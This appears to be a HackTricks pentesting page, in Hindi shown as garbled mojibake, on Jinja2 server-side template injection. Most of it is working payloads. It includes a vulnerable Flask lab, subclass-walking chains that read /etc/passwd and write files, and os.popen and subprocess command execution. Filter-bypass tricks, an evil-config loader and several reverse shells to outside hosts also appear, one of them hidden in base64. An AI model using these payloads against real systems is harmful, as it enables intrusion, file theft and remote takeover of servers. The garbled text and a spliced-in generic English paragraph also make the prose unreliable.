# Jinja2 SSTI

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░реЗрдВ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

## **рд▓реИрдм**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def home():
if request.args.get('c'):
return render_template_string(request.args.get('c'))
else:
return "Hello, send someting inside the param 'c'!"

if __name__ == "__main__":
app.run()
```
## **рд╡рд┐рд╡рд┐рдз**

### **рдбреАрдмрдЧ рд╕реНрдЯреЗрдЯрдореЗрдВрдЯ**

рдпрджрд┐ рдбреАрдмрдЧ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рд╕рдХреНрд╖рдо рд╣реИ, рддреЛ рдПрдХ `debug` рдЯреИрдЧ рдЙрдкрд▓рдмреНрдз рд╣реЛрдЧрд╛ рдЬреЛ рд╡рд░реНрддрдорд╛рди рд╕рдВрджрд░реНрдн рдХреЛ рдФрд░ рдЙрдкрд▓рдмреНрдз рдлрд╝рд┐рд▓реНрдЯрд░ рдФрд░ рдЯреЗрд╕реНрдЯ рдХреЛ рдбрдВрдк рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрдЧрд╛ред рдпрд╣ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрд▓рдмреНрдз рд╣реИ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдмрд┐рдирд╛ рдХрд┐рд╕реА рдбреАрдмрдЧрд░ рдХреЛ рд╕реЗрдЯ рдХрд┐рдПред
```python
<pre>

{% raw %}
{% debug %}
{% endraw %}





</pre>
```
рд╕реНрд░реЛрдд: [https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### **рд╕рднреА рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдбрдВрдк рдХрд░реЗрдВ**
```python
{{ config }} #In these object you can find all the configured env variables


{% raw %}
{% for key, value in config.items() %}
<dt>{{ key|e }}</dt>
<dd>{{ value|e }}</dd>
{% endfor %}
{% endraw %}




```
## **рдЬрд┐рдВрдЬрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди**

рд╕рдмрд╕реЗ рдкрд╣рд▓реЗ, рдЬрд┐рдВрдЬрд╛ рдЗрдВрдЬреЗрдХреНрд╢рди рдореЗрдВ рдЖрдкрдХреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдвреВрдВрдврд╝рдирд╛ рд╣реЛрдЧрд╛** рдФрд░ рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рдпрдерди рдирд┐рд╖реНрдкрд╛рджрди рдлреНрд▓реЛ рддрдХ рдкрд╣реБрдВрдЪ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рд╡реЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** рдЬреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рдирд╣реАрдВ рд╣реИрдВ рд▓реЗрдХрд┐рди рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╕реЗ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реИрдВ**ред

### рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдХреЛрдб `render_template("hello.html", username=username, email=email)` рдореЗрдВ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ username рдФрд░ email **рдЧреИрд░-рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдкрд╛рдпрдерди рдПрдирд╡реА рд╕реЗ рдЖрддреЗ рд╣реИрдВ рдФрд░ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдПрдирд╡реА рдХреЗ рдЕрдВрджрд░ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрдВрдЧреЗ**ред\
\*\*\*\*рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рд╡рд╣рд╛рдВ рдЕрдиреНрдп рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рднреА рд╣реЛрдВрдЧреЗ рдЬреЛ **рд╕рджреИрд╡ рд╕реИрдВрдбрдмреЙрдХреНрд╕ рдПрдирд╡реА рд╕реЗ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рд╣реЛрдВрдЧреЗ**, рдпреЗ рд╣реИрдВ:
```
[]
''
()
dict
config
request
```
### рд╡рд╕реНрддреНрд░реЛрдВ рдХреА рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрддрд┐

рдлрд┐рд░, рдЗрди рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд╕реЗ рд╣рдореЗрдВ рдХрдХреНрд╖рд╛ рддрдХ рдкрд╣реБрдВрдЪрдиреА рд╣реЛрдЧреА: **`<class 'object'>`** рддрд╛рдХрд┐ рд╣рдо рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ **рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд** рдХрд░ рд╕рдХреЗрдВред рдЗрд╕рд▓рд┐рдП рдЗрд╕ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реЗ рд╣рдо **`__subclasses__`** рд╡рд┐рдзрд┐ рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рдЧреИрд░-рд╕реИрдВрдбрдмреЙрдХреНрд╕** рдкрд╛рдпрдерди рдПрдирд╡реА рдореЗрдВ рд╕рднреА рдХрдХреНрд╖рд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ **рдСрдмреНрдЬреЗрдХреНрдЯ рдХрдХреНрд╖рд╛** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рдПрдХ рдХрдХреНрд╖рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ рдпрд╛ рддреЛ **`__base__`**, **`__mro__()[-1]`** рдпрд╛ `.`**`mro()[-1]`** рддрдХ рдкрд╣реБрдВрдЪрдирд╛ рд╣реЛрдЧрд╛ред рдФрд░ рдлрд┐рд░, рдЗрд╕ **рдСрдмреНрдЬреЗрдХреНрдЯ рдХрдХреНрд╖рд╛** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рдмрд╛рдж рд╣рдо **`__subclasses__()`** рдХреЛ **рдХреЙрд▓** рдХрд░рддреЗ рд╣реИрдВред

рдЗрди рдЙрджрд╛рд╣рд░рдгреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:
```python
# To access a class object
[].__class__
''.__class__
()["__class__"] # You can also access attributes like this
request["__class__"]
config.__class__
dict #It's already a class

# From a class to access the class "object".
## "dict" used as example from the previous list:
dict.__base__
dict["__base__"]
dict.mro()[-1]
dict.__mro__[-1]
(dict|attr("__mro__"))[-1]
(dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]

# From the "object" class call __subclasses__()
{{ dict.__base__.__subclasses__() }}
{{ dict.mro()[-1].__subclasses__() }}
{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}

{% raw %}
{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}

# Other examples using these ways
{{ ().__class__.__base__.__subclasses__() }}
{{ [].__class__.__mro__[-1].__subclasses__() }}
{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
{{ request.__class__.mro()[-1].__subclasses__() }}
{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
{% endraw %}






# Not sure if this will work, but I saw it somewhere
{{ [].class.base.subclasses() }}
{{ ''.class.mro()[1].subclasses() }}
```
### RCE рдПрд╕реНрдХреЗрдкрд┐рдВрдЧ

**рдЬрдм рд╣рдордиреЗ** `<class 'object'>` **рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛** рдФрд░ `__subclasses__` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рд╣рдо рдЕрдм рдЗрди рдХреНрд▓рд╛рд╕реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдФрд░ рдХреЛрдб рдХреЛ рдПрдХреНрдЬрд╝реЗрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

`__subclasses__` рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рд╣рдореЗрдВ **рд╣рдЬрд╛рд░реЛрдВ рдирдИ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓реА рд╣реИ**, рд╣рдореЗрдВ рд╕рд┐рд░реНрдл рдлрд╝рд╛рдЗрд▓ рдХреНрд▓рд╛рд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рд╣реА рдЦреБрд╢реА рд╣реЛрдЧреА рдЬрд┐рд╕рд╕реЗ рд╣рдо **рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝/рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ рдХрд┐рд╕реА рдРрд╕реЗ рдХреНрд▓рд╛рд╕ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рд╕реЗ рдЬрд┐рд╕рдореЗрдВ рдХрд┐рд╕реА рдХрдорд╛рдВрдб рдХреЛ рдПрдХреНрдЬрд╝реЗрдХреНрдпреВрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ (рдЬреИрд╕реЗ `os` рдХреНрд▓рд╛рд╕)ред

**рджреВрд░рд╕реНрде рдлрд╝рд╛рдЗрд▓ рдкрдврд╝рдирд╛/рд▓рд┐рдЦрдирд╛**
```python
# ''.__class__.__mro__[1].__subclasses__()[40] = File class
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```
**RCE** (Remote Code Execution) is a vulnerability that allows an attacker to execute arbitrary code on a target system remotely. This can be achieved by exploiting security flaws in the target application or server.

In the context of Server-Side Template Injection (SSTI) attacks, RCE refers to the ability to execute code within the server's template engine. One popular template engine is Jinja2, commonly used in Python web applications.

Jinja2 allows developers to dynamically generate HTML pages by embedding variables and expressions within templates. However, if user input is not properly sanitized or validated, it can lead to SSTI vulnerabilities.

To exploit an SSTI vulnerability in Jinja2, an attacker can inject malicious code into user-controllable input fields, such as form inputs or URL parameters. This code will then be executed by the server's template engine, leading to RCE.

The impact of an RCE through SSTI can be severe, as it allows an attacker to execute arbitrary commands on the server. This can lead to data breaches, server compromise, and unauthorized access to sensitive information.

To prevent SSTI vulnerabilities, it is crucial to properly validate and sanitize user input before using it in template rendering. Additionally, keeping software and libraries up to date can help mitigate potential security flaws.

In conclusion, RCE through SSTI is a dangerous vulnerability that can be exploited to execute arbitrary code on a target system. It is important for developers and system administrators to be aware of this risk and take appropriate measures to prevent it.
```python
# The class 396 is the class <class 'subprocess.Popen'>
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}

# Calling os.popen without guessing the index of the class

{% raw %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}

## Passing the cmd line in a GET param
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{% endraw %}


```
рдЕрдзрд┐рдХ рдХрдХреНрд╖рд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдиреНрдЬрд╛2 рдПрд╕рдПрд╕рдЯреАрдЖрдИ (Jinja2 SSTI) рдореЗрдВ рднрд╛рдЧ рд▓реЗрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### рдлрд╝рд┐рд▓реНрдЯрд░ рдмрд╛рдЗрдкрд╛рд╕

#### рд╕рд╛рдорд╛рдиреНрдп рдмрд╛рдЗрдкрд╛рд╕

рдпреЗ рдмрд╛рдЗрдкрд╛рд╕ рд╣рдореЗрдВ рд╡рд┐рд╢реЗрд╖ рдЕрдХреНрд╖рд░реЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдЧреБрдгреЛрдВ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗред\
рд╣рдордиреЗ рдкрд╣рд▓реЗ рдХреЗ рдЙрджрд╛рд╣рд░рдгреЛрдВ рдореЗрдВ рдХреБрдЫ рдЗрди рдмрд╛рдЗрдкрд╛рд╕ рдХреЛ рджреЗрдЦрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдВ рд╣рдо рдЙрдиреНрд╣реЗрдВ рд╕рдВрдХреНрд╖реЗрдк рдореЗрдВ рд╕рдорд░реАрдХрд░рдг рдХрд░реЗрдВрдЧреЗ:
```bash
# Without quotes, _, [, ]
## Basic ones
request.__class__
request["__class__"]
request['\x5f\x5fclass\x5f\x5f']
request|attr("__class__")
request|attr(["_"*2, "class", "_"*2]|join) # Join trick

## Using request object options
request|attr(request.headers.c) #Send a header like "c: __class__" (any trick using get params can be used with headers also)
request|attr(request.args.c) #Send a param like "?c=__class__
request|attr(request.query_string[2:16].decode() #Send a param like "?c=__class__
request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join) # Join list to string
http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_ #Formatting the string from get params

## Lists without "[" and "]"
http://localhost:5000/?c={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_

# Using with

{% raw %}
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
{% endraw %}




```
* [**рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВ**](jinja2-ssti.md#accessing-global-objects)
* [**рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓рд╛рд╕ рддрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд▓рд┐рдП рдпрд╣рд╛рдВ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВ**](jinja2-ssti.md#recovering-less-than-class-object-greater-than)
* [**рдСрдмреНрдЬреЗрдХреНрдЯ рдХреНрд▓рд╛рд╕ рдХреЗ рдмрд┐рдирд╛ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реЗ рдкрдврд╝реЗрдВ**](jinja2-ssti.md#jinja-injection-without-less-than-class-object-greater-than)

**HTML рдПрдирдХреЛрдбрд┐рдВрдЧ рд╕реЗ рдмрдЪреЗрдВ**

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ Flask рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЗ рднреАрддрд░ рд╕рднреА рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП HTML рдПрдирдХреЛрдб рдХрд░рддрд╛ рд╣реИ:
```python
{{'<script>alert(1);</script>'}}
#will be
&lt;script&gt;alert(1);&lt;/script&gt;
```
**рдпрд╣ `safe` рдлрд╝рд┐рд▓реНрдЯрд░** рд╣рдореЗрдВ рдкреЗрдЬ рдореЗрдВ JavaScript рдФрд░ HTML рдХреЛ **HTML рдХреЛрдбрд┐рдВрдЧ рдХреЗ рдмрд┐рдирд╛** рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдЗрд╕ рдкреНрд░рдХрд╛рд░:
```python
{{'<script>alert(1);</script>'|safe}}
#will be
<script>alert(1);</script>
```
**рдПрдХ рджреБрд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦрдХрд░ RCEред**

рдПрдХ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдЬрд┐рдирдЬрд╛2 рдЬреИрд╕реЗ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди (SSTI) рдЧрдВрднреАрд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣реИрдХрд░ рдПрдХ рджреБрд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рд▓рд┐рдЦ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕реЗ рдПрдХ рдЕрдиреБрд░реЛрдз рдореЗрдВ рднреЗрдЬрдХрд░ рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ:

1. рдЬрд┐рдирдЬрд╛2 рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред
2. рдПрдХ рджреБрд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рддреИрдпрд╛рд░ рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рд░рд┐рдореЛрдЯ рдХреЛрдб рд╣реЛред
3. рдЬрд┐рдирдЬрд╛2 рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рджреБрд╖реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд▓реЛрдб рдХрд░реЗрдВред
4. рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЯреЗрдореНрдкрд▓реЗрдЯ рдХреЛ рднреЗрдЬреЗрдВ рдФрд░ рд░рд┐рдореЛрдЯ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВред

рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣реИрдХрд░ рд░рд┐рдореЛрдЯ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд╕рдВрдЪрд╛рд▓рди рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рд╡реЗрдм рдРрдкреНрд▓рд┐рдХреЗрд╢рдиреЛрдВ рдХреЛ рд╕реБрд░рдХреНрд╖рд┐рдд рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд┐рдирдЬрд╛2 рдЯреЗрдореНрдкрд▓реЗрдЯ рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕рд╛рд╡рдзрд╛рди рд░рд╣рдирд╛ рдЪрд╛рд╣рд┐рдПред
```python
# evil config
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```
## рдХреБрдЫ рд╡рд░реНрдгреЛрдВ рдХреЗ рдмрд┐рдирд╛

**`{{`** **`.`** **`[`** **`]`** **`}}`** **`_`** рдХреЗ рдмрд┐рдирд╛
```python
{% raw %}
{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
{% endraw %}



```
## **\<class 'object'>** рдХреЗ рдмрд┐рдирд╛ Jinja Injection

[**рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕**](jinja2-ssti.md#accessing-global-objects) рд╕реЗ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ **RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрд╕ рдХреНрд▓рд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рди рдХрд░реЗрдВред**\
рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА **рдлрдВрдХреНрд╢рди** рддрдХ рдкрд╣реБрдВрдЪрддреЗ рд╣реИрдВ рдЙрди рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдореЗрдВ рд╕реЗ, рддреЛ рдЖрдкрдХреЛ **`__globals__.__builtins__`** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ **RCE** рдмрд╣реБрдд **рд╕рд░рд▓** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдЙрдкрдпреБрдХреНрдд **рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ** рдХреЗ **`request`**, **`config`** рдФрд░ рдХрд┐рд╕реА **рдЕрдиреНрдп** рд░реЛрдЪрдХ **рдЧреНрд▓реЛрдмрд▓ рдСрдмреНрдЬреЗрдХреНрдЯ** рд╕реЗ **рдлрдВрдХреНрд╢рди рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
{{ request.__class__.__dict__ }}
- application
- _load_form_data
- on_json_loading_failed

{{ config.__class__.__dict__ }}
- __init__
- from_envvar
- from_pyfile
- from_object
- from_file
- from_json
- from_mapping
- get_namespace
- __repr__

# You can iterate through children objects to find more
```
рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рдХреБрдЫ рдлрдВрдХреНрд╢рдиреНрд╕ рдЦреЛрдЬ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде рдмрд┐рд▓реНрдЯрд┐рдиреНрд╕ рдХреЛ рдкреБрдирд░реНрдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```python
# Read file
{{ request.__class__._load_form_data.__globals__.__builtins__.open("/etc/passwd").read() }}

# RCE
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ config.__class__.from_envvar["__globals__"]["__builtins__"]["__import__"]("os").popen("ls").read() }}
